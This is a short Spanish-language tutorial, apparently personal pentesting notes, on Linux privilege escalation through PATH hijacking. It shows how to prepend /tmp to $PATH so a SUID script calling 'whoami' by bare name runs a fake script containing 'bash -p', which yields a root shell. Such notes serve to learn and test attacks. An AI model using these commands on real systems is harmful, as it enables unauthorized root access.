Si vemos que un script con permisos SUID ejecuta un binario, por ejemplo `whoami`. Podemos secuestrar la ruta y crear un nuevo binario llamado whoami, pero que este primero en escala de relevancia del $PATH, me explico:

```bash
echo $PATH --> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Si nosotros hacemos el siguiente comando:

```bash
export PATH=/tmp:$PATH
echo $PATH --> /tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Coloca **1ro** en importancia al directorio tmp, osea que si nosotros creamos un script llamado _whoami_ en el directorio tmp, va a ejecutar ese del directorio _tmp_ en lugar de ejecutar el normal (_usr/bin/whoami_) 

El contenido del script puede ser el siguiente:

```bash
bash -p
```
Eso te da una bash con privilegios de root

**NOTA**: El script no tiene que ejecutar el binario por su ruta absoluta (_/usr/bin/whoami_), lo tiene que ejecutar solo como si fuera un comando simple del sistema (_whoami_).